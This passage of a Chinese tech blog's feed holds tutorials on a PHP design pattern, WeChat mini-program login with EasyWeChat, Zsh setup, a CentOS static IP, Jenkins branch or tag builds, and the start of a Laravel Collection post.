class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">(string $method)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($method, <span class="keyword">$this</span>-&gt;actionCode)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">"非法操作，禁止越级操作"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;auth($name)-&gt;strategy($name)-&gt;$name(...$arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤四"><a href="#步骤四" class="headerlink" title="步骤四"></a>步骤四</h3><p>控制器调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">user</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionA</span><span class="params">(OrderRequest $request)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      $param = $request-&gt;only([<span class="string">'order_id'</span>]);</span><br><span class="line">   </span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          (<span class="keyword">new</span> OrderAction(<span class="string">"worker"</span>, $param[<span class="string">'order_id'</span>]))-&gt;actionA($param);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (OrderException $exception) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;failed($exception-&gt;getMessage());</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;success();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，该业务的核心流程已经通过职责连模式和反射实现。</p><p>回头再看看这些代码，其实也不会有什么难度，只是自己在这方便的锻炼太少了，每每遇到问题，总是很难将需求抽象，或者尽管知道用什么设计模式，但最终导致写不出来。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;del&gt;设计模式是区分程序员能力大小的一个重要因素——Boo。&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    <category term="设计模式" scheme="https://www.0x2beace.com/categories/PHP/Laravel/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
    <category term="设计模式" scheme="https://www.0x2beace.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>小程序开发经验总结</title>
    <link href="https://www.0x2beace.com/summary-of-mini-program-development-experience/"/>
    <id>https://www.0x2beace.com/summary-of-mini-program-development-experience/</id>
    <published>2021-05-12T13:09:23.000Z</published>
    <updated>2021-05-13T13:31:49.175Z</updated>
    
    <content type="html"><![CDATA[<p>通常对接小程序，为了加快开发速度，会直接使用 <a href="https://github.com/overtrue/wechat" target="_blank" rel="noopener">EasyWeChat</a> 这个扩展包进行开发，EasyWeChat 已经封装好了微信相关的接口，使用起来非常方便。</p><a id="more"></a><h2 id="小程序登录流程"><a href="#小程序登录流程" class="headerlink" title="小程序登录流程"></a>小程序登录流程</h2><p>下图是微信官方提供的时序图：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210511161052.png" alt=""></p><p>整理成流程，大概就是：</p><ol><li>小程序调用 <code>wx.login()</code> 接口获取<strong>临时登录凭证（code）</strong>，这一步用户是无感知的，无需用户授权；</li><li>小程序提交 <code>code</code> 到 开发者服务器；</li><li>开发者服务器通过 <code>appid</code>、<code>appsecret</code> 和 <code>code</code> 请求微信接口，换取用户的 <code>session_key</code> 和 <code>openid</code>；</li><li>开发者服务器根据 <code>openid</code> 查找到对应的用户，存入 <code>session_key</code>，然后为该用户生成 access_token （JWT）返回给小程序。</li><li>有了 <code>access_token</code> 小程序就可以调用任意接口了。</li></ol><p>注意这里的 <code>session_key</code> 是一个比较特殊的设计，是用户的 会话密钥，需要存储在服务器中，调用获取用户信息、获取微信用户绑定的手机号等微信接口时，需要用这个 会话密钥 才能解密获取相关数据。每次调用 <code>wx.login()</code> 之后，微信都会自动生成新的 <code>session_key</code> ，导致之前的 <code>session_key</code> 失效，所以在必要的时候再去调用 <code>wx.login()</code>，而且还要及时保存 <code>session_key</code> 到服务器，以备后续使用。</p><p>此段流程整理来自Laravel 社区的<a href="https://learnku.com/courses/laravel-weapp/2.0/small-program-login-detailed-solution/4933#0dfb2b" target="_blank" rel="noopener">《L04 Laravel教程-微信小程序从零到发布》</a>。</p><h2 id="获取OpenID和SessionKey"><a href="#获取OpenID和SessionKey" class="headerlink" title="获取OpenID和SessionKey"></a>获取OpenID和SessionKey</h2><p>清楚了小程序的登录流程之后，可以动手来获取<code>code</code>了。</p><h3 id="创建小程序"><a href="#创建小程序" class="headerlink" title="创建小程序"></a>创建小程序</h3><p>这里建议使用最新版本的微信开发者工具，以免出现一些不必要的问题。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210511163706.png" alt=""></p><p>填入AppID，点击新建。</p><p>初始化的小程序无需做任何更改，只需要在<code>wx.login()</code> 下面增加一行<code>console.log(res)</code> 将结果打印在控制台中，然后重新编译，即可看到控制台中输出了 <code>code</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210512211535.png" alt=""></p><p>拿到<code>code</code> 之后，就可以获取<code>OpenID</code>、<code>SessionKey</code>了。</p><h3 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h3><p>为了方便调试，这里直接在 Laravel 的Tinker 中进行测试，以下代码逐行粘贴在 tinker 中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">EasyWeChat</span>\<span class="title">Factory</span>;</span><br><span class="line">$config = [</span><br><span class="line">    <span class="string">'app_id'</span> =&gt; <span class="string">'wx2b41f13e5e*****'</span>,</span><br><span class="line">    <span class="string">'secret'</span> =&gt; <span class="string">'92474ce5be69c4fb25392d6cfb******'</span>,</span><br><span class="line">    <span class="string">'response_type'</span> =&gt; <span class="string">'array'</span>,</span><br><span class="line">    <span class="string">'log'</span> =&gt; [</span><br><span class="line">        <span class="string">'level'</span> =&gt; <span class="string">'debug'</span>,</span><br><span class="line">    ],</span><br><span class="line">];</span><br><span class="line">$app = Factory::miniProgram($config);</span><br><span class="line">$app-&gt;auth-&gt;session(<span class="string">'CODE'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正常输出如下：</span></span><br><span class="line">[</span><br><span class="line">     <span class="string">"session_key"</span> =&gt; <span class="string">"nFpZ0gfHKOtYQ878enM*****"</span>,</span><br><span class="line">     <span class="string">"openid"</span> =&gt; <span class="string">"oN7jq1ejz5KQX5JtEiBsL*****"</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>其中<code>app_id</code> 和<code>secret</code> 需要开发者通过微信开发平台自行获取：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210510234405.png" alt=""></p><p>不填或者填入错误的<code>app_id</code> 和 <code>secret</code> 都会导致获取OpenID异常。</p><p>如果遇到异常，可以对照微信官方文档——<a href="https://developers.weixin.qq.com/doc/offiaccount/Getting_Started/Global_Return_Code.html" target="_blank" rel="noopener">全局返回码</a>进行排查分析。</p><h3 id="登录凭证校验"><a href="#登录凭证校验" class="headerlink" title="登录凭证校验"></a>登录凭证校验</h3><p>拿到OpenID及 SessionKey 之后，下一步就可以进行解密了，这一步也是通过<code>EasyWeCaht</code> 来完成。</p><p>根据前面的时序图，可以得知，登录凭证校验需要用到以下参数：</p><ul><li>appid：iv</li><li>appsecret：encryptedData</li><li>code：上面拿到的SessionKey</li></ul><p>最后一个都好理解，可是前面两个分别是什么鬼？</p><p>不着急，先打开微信开发者工具，在<code>app.js</code> 中，加入以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app.js</span></span><br><span class="line">App(&#123;</span><br><span class="line">  onLaunch() &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户信息</span></span><br><span class="line">    wx.getSetting(&#123;</span><br><span class="line">      success: <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (res.authSetting[<span class="string">'scope.userInfo'</span>]) &#123;</span><br><span class="line">          <span class="comment">// 已经授权，可以直接调用 getUserInfo 获取头像昵称，不会弹框</span></span><br><span class="line">          wx.getUserInfo(&#123;</span><br><span class="line">            success: <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">              <span class="built_in">console</span>.log(res)  </span><br><span class="line">            &#125;</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">  globalData: &#123;</span><br><span class="line">    userInfo: <span class="literal">null</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>保存之后，再次编译，查看控制台输出：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210513151643.png" alt=""></p><p>这两个就是我们需要的数据了，拿到之后，再次打开<code>Tinker</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$app-&gt;encryptor-&gt;decryptData(&quot;SessionKey&quot;, &quot;iv&quot;, &quot;encryptedData&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210513151926.png" alt=""></p><p>正常情况下，返回结果会包含当前登录用户的个人信息，我这里用的是测试号，因此并没有譬如手机号这类字段。</p><p>至此，小程序登录与微信接口服务的交互就告一段落了，获取到用户身份之后的逻辑就不用多说了。</p><p>上面小程序端的代码只是演示如何拿到需要的参数，实际开发并不建议用此方式直接写在<code>app.js</code> 中。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;通常对接小程序，为了加快开发速度，会直接使用 &lt;a href=&quot;https://github.com/overtrue/wechat&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;EasyWeChat&lt;/a&gt; 这个扩展包进行开发，EasyWeChat 已经封装好了微信相关的接口，使用起来非常方便。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>如何配置一个简洁高效的 Zsh</title>
    <link href="https://www.0x2beace.com/how-to-configure-a-simple-and-efficient-zsh/"/>
    <id>https://www.0x2beace.com/how-to-configure-a-simple-and-efficient-zsh/</id>
    <published>2021-05-09T00:48:19.000Z</published>
    <updated>2021-05-09T00:48:56.131Z</updated>
    
    <content type="html"><![CDATA[<p>Shell 是类 Unix 系统中超级好用的工具，而 Zsh 是 Shell 中的佼佼者，但是现在网上一搜索 Zsh 的配置方案，遍地都是的互相复制粘贴的<code>oh-my-zsh</code> 配置方案。事实上 <code>oh-my-zsh</code> 并不好用，严重拖慢了 Zsh 的速度，下面分享一个简洁高效的Zsh 配置方案。</p><a id="more"></a><h3 id="安装Zsh"><a href="#安装Zsh" class="headerlink" title="安装Zsh"></a>安装Zsh</h3><p>这里直接从发行版的源中进行安装，简单、高效：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install zsh</span><br></pre></td></tr></table></figure><h3 id="安装插件及主题"><a href="#安装插件及主题" class="headerlink" title="安装插件及主题"></a>安装插件及主题</h3><p>两个插件一个主题：</p><ul><li><code>zsh-autosuggestions</code>：这个是自动建议插件，能够自动提示你需要的命令。</li><li><code>zsh-syntax-highlighting</code>：这个是代码高亮插件，能够使你的命令行各个命令清晰明了。</li><li><code>zsh-theme-powerlevel10k</code> 这个主题提供漂亮的提示符，可以显示当前路径、时间、命令执行成功与否，还能够支持 git 分支显示等等。</li></ul><p>一键安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install zsh-autosuggestions zsh-syntax-highlighting zsh-theme-powerlevel9k</span><br></pre></td></tr></table></figure><p>不出意外的话，会提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E: Unable to locate package zsh-autosuggestions</span><br></pre></td></tr></table></figure><p>这是因为软件源中并没有<code>zsh-autosuggestions</code> 这个package，所以需要手动添加软件包。</p><p>这里可以直接进入<a href="https://software.opensuse.org/" target="_blank" rel="noopener">opensuse</a> 进行搜索，需要的软件包。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210509084534.png" alt=""></p><p>找到对应的发行版，点击Export Download：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210509084558.png" alt=""></p><p>这里提供两种方式供我们选择：</p><ol><li>添加软件源并手动安装</li><li>直接抓取二进制软件包</li></ol><p>直接给结论，第二种方式更简单些，直接下载.deb文件之后，就可以安装了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210509084624.png" alt=""></p><p>选择对应的操作系统以及版本，右键拷贝链接地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">  wget https://download.opensuse.org/repositories/shells:/zsh-users:/zsh-autosuggestions/xUbuntu_18.04/amd64/zsh-autosuggestions_0.5.0+1.1_amd64.deb</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo dpkg -i zsh-autosuggestions_0.5.0+1.1_amd64.deb</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210509084643.png" alt=""></p><p>再次执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install zsh-autosuggestions zsh-syntax-highlighting zsh-theme-powerlevel9k</span><br></pre></td></tr></table></figure><p>至此，插件和主题就安装完成了。</p><h3 id="更改默认Shell"><a href="#更改默认Shell" class="headerlink" title="更改默认Shell"></a>更改默认Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chsh -s &#x2F;usr&#x2F;bin&#x2F;zsh</span><br></pre></td></tr></table></figure><p>注销并重新登录，再次登录成功时，默认启用了zsh。</p><h3 id="配置插件和主题"><a href="#配置插件和主题" class="headerlink" title="配置插件和主题"></a>配置插件和主题</h3><p>第一次进入 Zsh 会自动出现一个配置界面，这个界面可以根据需要自定义 Zsh。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210509084659.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210509084717.png" alt=""></p><p>配置界面中各个菜单代表的意思分别是：</p><p>1：设置命令历史记录相关的选项<br>2：设置命令补全系统<br>3：设置热建<br>4：选择各种常见的选项，只需要选择“On”或者“Off”<br>0：退出，并使用空白（默认）配置<br>a：终止设置并退出<br>q：退出</p><h3 id="启用插件和主题"><a href="#启用插件和主题" class="headerlink" title="启用插件和主题"></a>启用插件和主题</h3><p>Zsh 的配置文件是 <code>~/.zshrc</code> 文件，这个文件在你的用户目录下 <code>~/</code>。删掉了这个文件，再次进入 Zsh时，会再次进入 Zsh 的配置界面。</p><p>将以下代码加入到 <code>~/.zshrc</code> 文件中，以启用插件和主题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">source &#x2F;usr&#x2F;share&#x2F;powerlevel9k&#x2F;powerlevel9k.zsh-theme</span><br><span class="line">source &#x2F;usr&#x2F;share&#x2F;zsh-autosuggestions&#x2F;zsh-autosuggestions.zsh</span><br><span class="line">source &#x2F;usr&#x2F;share&#x2F;zsh-syntax-highlighting&#x2F;zsh-syntax-highlighting.zsh</span><br></pre></td></tr></table></figure><p>再次注销并登录，即可看到新的终端界面：<br><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210509084734.png" alt=""></p><h3 id="原文地址"><a href="#原文地址" class="headerlink" title="原文地址"></a>原文地址</h3><ul><li><a href="https://linux.cn/article-13030-1.html" target="_blank" rel="noopener">配置一个简洁高效的 Zsh</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Shell 是类 Unix 系统中超级好用的工具，而 Zsh 是 Shell 中的佼佼者，但是现在网上一搜索 Zsh 的配置方案，遍地都是的互相复制粘贴的&lt;code&gt;oh-my-zsh&lt;/code&gt; 配置方案。事实上 &lt;code&gt;oh-my-zsh&lt;/code&gt; 并不好用，严重拖慢了 Zsh 的速度，下面分享一个简洁高效的Zsh 配置方案。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Centos 7 设置静态 IP</title>
    <link href="https://www.0x2beace.com/centos-7-set-static-ip/"/>
    <id>https://www.0x2beace.com/centos-7-set-static-ip/</id>
    <published>2021-05-07T14:05:55.000Z</published>
    <updated>2021-05-07T14:06:55.620Z</updated>
    
    <content type="html"><![CDATA[<p>通常本地的虚拟机，默认都是动态IP，这就意味着，每次重启机器，IP 地址都会发生变化，虽然不影响正常使用，但是每次重启都发生变化，这就导致还需要看一眼，才知道当前新的IP 是多少，那么有没有什么办法可以永久设置成静态IP 呢，答案是有的。</p><a id="more"></a><p>系统版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;redhat-release </span><br><span class="line">CentOS Linux release 7.8.2003 (Core)</span><br></pre></td></tr></table></figure><p>查看当前网卡的名称：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210507115101.png" alt=""></p><blockquote><p>一台电脑可能有多个网卡，如何判断哪一个是当前正在使用的？</p></blockquote><p>就看哪个网卡的IP 刚好是该机器当前的IP。</p><p>比如在上面的例子中，机器当前的IP 是<code>192.168.1.100</code>，那么只要确定某个网卡的IP 也是 <code>192.168.1.100</code>，那这个网卡就是我们要找的了。</p><p>编辑对应的配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts</span><br><span class="line">$ vim ifcfg-网卡名称</span><br></pre></td></tr></table></figure><p>设置静态IP 配置文件如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">TYPE="Ethernet"</span><br><span class="line">PROXY_METHOD="none"</span><br><span class="line">BROWSER_ONLY="no"</span><br><span class="line">BOOTPROTO="static"         # 使用静态IP地址，默认为动态，即dhcp</span><br><span class="line">IPADDR="192.168.241.100"   # 设置的静态IP地址</span><br><span class="line">NETMASK="255.255.255.0"    # 子网掩码</span><br><span class="line">GATEWAY="192.168.1.1"      # 网关地址</span><br><span class="line">DNS1="114.114.114.114"     # DNS服务器</span><br><span class="line">DEFROUTE="yes"</span><br><span class="line"></span><br><span class="line">IPV4_FAILURE_FATAL="no"</span><br><span class="line">IPV6INIT="yes"</span><br><span class="line">IPV6_AUTOCONF="yes"</span><br><span class="line">IPV6_DEFROUTE="yes"</span><br><span class="line">IPV6_FAILURE_FATAL="no"</span><br><span class="line">IPV6_ADDR_GEN_MODE="stable-privacy"</span><br><span class="line"></span><br><span class="line">NAME="ens33"</span><br><span class="line">UUID="95b614cd-79b0-4755-b08d-99f1cca7271b"</span><br><span class="line">DEVICE="ens33"</span><br><span class="line"></span><br><span class="line">ONBOOT="yes"               #是否开机启用</span><br></pre></td></tr></table></figure><p>重启网络：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> service network restart</span></span><br></pre></td></tr></table></figure><p>如果没有生效，可以尝试编辑<code>/etc/resolv.conf</code>，加入以下配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nameserver 114.114.114.114  # 和上面的DNS 服务器保持一致</span><br></pre></td></tr></table></figure><p>再次重启网络。</p><p>需要注意的是：这种配置是永久生效的，即使下次重启电脑，IP 地址也不会发生变化。</p><p>至此，就完成了设置静态IP 的全部配置。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;通常本地的虚拟机，默认都是动态IP，这就意味着，每次重启机器，IP 地址都会发生变化，虽然不影响正常使用，但是每次重启都发生变化，这就导致还需要看一眼，才知道当前新的IP 是多少，那么有没有什么办法可以永久设置成静态IP 呢，答案是有的。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Centos" scheme="https://www.0x2beace.com/tags/Centos/"/>
    
  </entry>
  
  <entry>
    <title>如何利用Jenkins 实现标签或者分支选择性构建</title>
    <link href="https://www.0x2beace.com/how-to-use-jenkins-to-implement-tag-or-branch-selective-construction/"/>
    <id>https://www.0x2beace.com/how-to-use-jenkins-to-implement-tag-or-branch-selective-construction/</id>
    <published>2021-05-06T13:08:51.000Z</published>
    <updated>2021-05-06T13:10:02.763Z</updated>
    
    <content type="html"><![CDATA[<p>如题。</p><a id="more"></a><p>需求可以简单描述为：在Jenkins 中通过手动的方式自主选择标签或者分支进行构建。而不是通过 Push 事件进行自动触发。</p><p>在正式开始之前，需要先安装 <code>Git Parameter</code> 插件。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210506205636.png" alt=""></p><p>在可选插件中搜索<code>Git Parameter</code>，进行安装。</p><p>正常安装完成，可以看到如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210506205903.png" alt=""></p><p>创建一个自由风格的软件项目：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210506205922.png" alt=""></p><p>选择参数化构建过程，参数类型选择分支或标签：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210506210012.png" alt=""></p><p>源码管理选择Git，填上项目地址，如果是私有项目，需要添加 Credential：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210506210049.png" alt=""></p><p>最后点击保存即可。</p><p>点击<code>Build with Parameters</code>，可以看到所有标签和分支，手动选择不同的分支和标签即可进行构建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210506210303.png" alt=""></p><p>可以看到核心的步骤其实只有两步，如果还有其他需求，比如构建完成之后，执行某个脚本，也是可以实现的，</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.huaweicloud.com/articles/0591d64c9060a6484280fe1d55d251dc.html" target="_blank" rel="noopener">Jenkins教程（三）添加凭据与流水线拉取Git代码</a></li><li><a href="https://www.jianshu.com/p/927a1599f7a0" target="_blank" rel="noopener">Jenkins参数化构建-插件:Git Parameter</a></li><li><a href="http://www.mydlq.club/article/45/" target="_blank" rel="noopener">Jenkins 中使用 Git Parameter 插件动态获取 Git 的分支</a></li><li><a href="https://www.cnblogs.com/zt007/p/9472524.html" target="_blank" rel="noopener">Jenkins：使用Git Parameter插件实现tag或分支的选择性构建</a></li><li><a href="https://testerhome.com/articles/17383" target="_blank" rel="noopener">利用 jenkins 达到提 tag 自动打包</a></li><li><a href="https://www.cnblogs.com/tugenhua0707/p/11949644.html" target="_blank" rel="noopener">Jenkins 实现前端自动打包,自动部署代码及邮件提醒功能</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;如题。&lt;/p&gt;</summary>
    
    
    
    <category term="Jenkins" scheme="https://www.0x2beace.com/categories/Jenkins/"/>
    
    
    <category term="Jenkins" scheme="https://www.0x2beace.com/tags/Jenkins/"/>
    
  </entry>
  
  <entry>
    <title>Laravel Collection 实际使用</title>
    <link href="https://www.0x2beace.com/the-actual-use-of-collection-in-laravel/"/>
    <id>https://www.0x2beace.com/the-actual-use-of-collection-in-laravel/</id>
    <published>2021-05-04T00:32:36.000Z</published>
    <updated>2021-06-05T01:38:06.847Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记用来整理Collection 在Laravel 的实际应用场景。</p><a id="more"></a><h2 id="求和"><a href="#求和" class="headerlink" title="求和"></a>求和</h2><blockquote><p>需求：遍历$orders 数组，求price 的和。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 引入package</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line">$orders = [[</span><br><span class="line">    <span class="string">'id'</span>            =&gt;      <span class="number">1</span>,</span><br><span class="line">    <span class="string">'user_id'</span>       =&gt;      <span class="number">1</span>,</span><br><span class="line">    <span class="string">'number'</span>        =&gt;      <span class="string">'13908080808'</span>,</span><br><span class="line">    <span class="string">'status'</span>        =&gt;      <span class="number">0</span>,</span><br><span class="line">    <span class="string">'fee'</span>           =&gt;      <span class="number">10</span>,</span><br><span class="line">    <span class="string">'discount'</span>      =&gt;      <span class="number">44</span>,</span><br><span class="line">    <span class="string">'order_products'</span>=&gt; [</span><br><span class="line">        [<span class="string">'order_id'</span>=&gt;<span class="number">1</span>,<span class="string">'product_id'</span>=&gt;<span class="number">1</span>,<span class="string">'param'</span>=&gt;<span class="string">'6寸'</span>,<span class="string">'price'</span>=&gt;<span class="number">555.00</span>,<span class="string">'product'</span>=&gt;[<span class="string">'id'</span>=&gt;<span class="number">1</span>,<span class="string">'name'</span>=&gt;<span class="string">'蛋糕名称'</span>,<span class="string">'images'</span>=&gt;[]]],</span><br><span 